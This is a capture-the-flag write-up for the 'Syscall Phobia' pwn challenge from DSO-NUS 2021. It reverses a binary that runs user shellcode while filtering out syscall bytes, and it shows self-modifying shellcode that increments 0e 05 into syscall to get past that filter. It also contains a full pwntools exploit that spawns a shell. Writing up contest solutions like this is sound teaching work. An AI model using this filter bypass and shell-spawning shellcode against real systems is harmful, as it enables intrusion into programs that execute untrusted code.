---
title: "Syscall Phobia [150]"
tags: [DSO-NUS 2021, Binary Exploitation]
excerpt: "Binary Exploitation"
layout: single
classes: wide
--- 

**Category:** Pwn

## Challenge Description

> Timmy has created a program to execute any x86_64 bytecode instructions! However, Timmy has an absolute detest for syscalls, and does not want anyone to insert syscalls into their instructions. This will make it a little secure... right?

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/DSO%20NUS%20CTF/Binary%20Exploitation/Syscall%20Phobia){: .btn .btn--primary}

## Solution

We are provided with a 64-bit ELF executable:

```
$ file syscall-phobia
syscall-phobia: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=446d8daadfa7e20968f5c991223fc5b80b12aac0, stripped
```

As usual, I start by running the binary to get a general overview of what to expect:

```
$ ./syscall-phobia
Enter your hexadecimal bytecode here and we will execute it for you!
We absolutely hate syscalls so please DO NOT enter syscall instructions here :D
Example: 554889e5c9c3

Enter assembly bytecode here! (No syscalls please, tenks):
AAAAAAAA
Executing your assembly code!
Segmentation fault
```

The challenge expects shellcode as input, which is then executed. However, as mentioned by the challenge description, the shellcode cannot contain `syscall` instructions. I can confirm my initial analysis by reversing the `main()` function in IDA:

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char buf[260]; // [rsp+0h] [rbp-110h] BYREF
  int v5; // [rsp+104h] [rbp-Ch]
  void *haystack; // [rsp+108h] [rbp-8h]

  haystack = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Enter your hexadecimal bytecode here and we will execute it for you!");
  puts("We absolutely hate syscalls so please DO NOT enter syscall instructions here :D");
  puts("Example: 554889e5c9c3\n");
  puts("Enter assembly bytecode here! (No syscalls please, tenks): ");
  fflush(stdout);
  fgets(buf, 200, stdin);
  buf[strcspn(buf, "\n")] = 0;
  v5 = convert_bytecode(buf, haystack);
  if ( memmem(haystack, v5, &syscall, 2uLL) || memmem(haystack, v5, &int_0x80, 2uLL) )
  {
    puts("Hey! I told you no syscalls! :(");
    exit(1);
  }
  puts("Executing your assembly code!");
  fflush(stdout);
  qword_6020A0 = haystack;
  (haystack)();
  return 0LL;
}
```

As seen from above, the binary reads in our shellcode into `buf`. 
```c
fgets(buf, 200, stdin);
```

The shellcode is then converted using the `convert_bytecode()` function and stored in `haystack`.
```c
v5 = convert_bytecode(buf, haystack);
```

This is the important part: If `syscall` or `int 0x80` instructions are found in the shellcode, the binary immediately exits without executing our shellcode:
```c
if ( memmem(haystack, v5, &syscall, 2uLL) || memmem(haystack, v5, &int_0x80, 2uLL) ) {
    puts("Hey! I told you no syscalls! :(");
    exit(1);
}
```

Thus, the objective is to somehow bypass this `syscall` filter and let the binary execute our shellcode here:
```c
puts("Executing your assembly code!");
(haystack)();
```

Initially, I thought of somehow not using `syscall` instructions at all. However, a quick Google search showed me [this](https://stackoverflow.com/questions/52620930/is-there-a-way-to-write-shellcode-for-sendfile-that-does-not-use-syscall-instruc):
> Or even easier, start with `0e 05` ... in memory, and use `inc  byte ptr  syscall_location[rip]` to modify it to `0f 05` ...

As the opcode of `syscall` is `0f 05`, the idea is to first write `0e 05` in our shellcode, and then increment the instruction using `inc BYTE PTR [rip]` to make it `0f 05`: 
```shell
fe 05 00 00 00 00       inc    BYTE PTR [rip]   // increment instruction below by 1
0e 05                   ???                     // becomes syscall when executed
```

Now that we have a way to use `syscall` instructions, all that's left to do is write shellcode to pop shell, which is trivial with `pwntools`:
``` shell
$ python
Python 2.7.18 (default, Aug  4 2020, 11:16:42)
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> print disasm(asm(shellcraft.sh()))
   0:   6a 68                   push   0x68
   2:   68 2f 2f 2f 73          push   0x732f2f2f
   7:   68 2f 62 69 6e          push   0x6e69622f
   c:   89 e3                   mov    ebx, esp
   e:   68 01 01 01 01          push   0x1010101
  13:   81 34 24 72 69 01 01    xor    DWORD PTR [esp], 0x1016972
  1a:   31 c9                   xor    ecx, ecx
  1c:   51                      push   ecx
  1d:   6a 04                   push   0x4
  1f:   59                      pop    ecx
  20:   01 e1                   add    ecx, esp
  22:   51                      push   ecx
  23:   89 e1                   mov    ecx, esp
  25:   31 d2                   xor    edx, edx
  27:   6a 0b                   push   0xb
  29:   58                      pop    eax
  2a:   cd 80                   int    0x80
```

We simply replace the last `int 0x80` instruction with `inc    BYTE PTR [rip]`, and append `0e 05` to the end of our shellcode:
```python
shellcode = asm(
        "push   0x68;"
        "movabs rax, 0x732f2f2f6e69622f;"
        "push   rax;"
        "mov    rdi, rsp;"
        "push   0x1016972;"
        "xor    DWORD PTR [rsp], 0x1010101;"
        "xor    esi, esi;"
        "push   rsi;"
        "push   0x8;"
        "pop    rsi;"
        "add    rsi, rsp;"
        "push   rsi;"
        "mov    rsi, rsp;"
        "xor    edx, edx;"
        "push   0x3b;"
        "pop    rax;"
        "inc    BYTE PTR [rip];",
        arch = 'amd64', os = 'linux'
    )

a = ['0x{:02x}'.format(u8(a))[2:] for a in shellcode]   # Converting shellcode to hex string
a += ["0e", "05", "90", "90", "90"]                     # add syscall + a few NOPs
payload = ''.join(a)
```

When the binary executes this shellcode, it pops a shell:
```shell
$ python solve.py
[*] '/mnt/c/Users/Brandon Chong/Downloads/writeup stuffs/Syscall Phobia/syscall-phobia'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/mnt/c/Users/Brandon Chong/Downloads/writeup stuffs/Syscall Phobia/syscall-phobia': pid 3632
[*] Paused (press any to continue)
   0:   6a 68                   push   0x68
   2:   48 b8 2f 62 69 6e 2f    movabs rax, 0x732f2f2f6e69622f
   9:   2f 2f 73
   c:   50                      push   rax
   d:   48 89 e7                mov    rdi, rsp
  10:   68 72 69 01 01          push   0x1016972
  15:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
  1c:   31 f6                   xor    esi, esi
  1e:   56                      push   rsi
  1f:   6a 08                   push   0x8
  21:   5e                      pop    rsi
  22:   48 01 e6                add    rsi, rsp
  25:   56                      push   rsi
  26:   48 89 e6                mov    rsi, rsp
  29:   31 d2                   xor    edx, edx
  2b:   6a 3b                   push   0x3b
  2d:   58                      pop    rax
  2e:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x34
[*] Payload: 6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b58fe05000000000e05909090
[*] Payload length: 114
[*] Switching to interactive mode

Executing your assembly code!
$ ls
solve.py  syscall-phobia  syscall-phobia.i64
``` 

Full exploit code:
```python
from pwn import *
import sys

exe = ELF("./syscall-phobia")
host = "ctf-85ib.balancedcompo.site" 
port = 9998

def exploit(p):
    shellcode = asm(
        "push   0x68;"
        "movabs rax, 0x732f2f2f6e69622f;"
        "push   rax;"
        "mov    rdi, rsp;"
        "push   0x1016972;"
        "xor    DWORD PTR [rsp], 0x1010101;"
        "xor    esi, esi;"
        "push   rsi;"
        "push   0x8;"
        "pop    rsi;"
        "add    rsi, rsp;"
        "push   rsi;"
        "mov    rsi, rsp;"
        "xor    edx, edx;"
        "push   0x3b;"
        "pop    rax;"
        "inc    BYTE PTR [rip];",
        arch = 'amd64', os = 'linux'
    )

    print(disasm(shellcode))
    
    a = ['0x{:02x}'.format(u8(a))[2:] for a in shellcode] # Converting shellcode to hex string
    a += ["0e", "05", "90", "90", "90"] # syscall + a few NOPs
    payload = ''.join(a)

    lg('Payload: ' + payload)
    lg('Payload length: ' + str(len(payload)))
    
    sla('Enter assembly bytecode here! (No syscalls please, tenks): ', payload)

    p.interactive()

if __name__ == "__main__":
    context.binary = exe

    if sys.argv[-1] == "remote":
        p = remote(host, port)
    else:
        p = process([exe.path])
        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    lg = lambda a : log.info(a)

    exploit(p)
```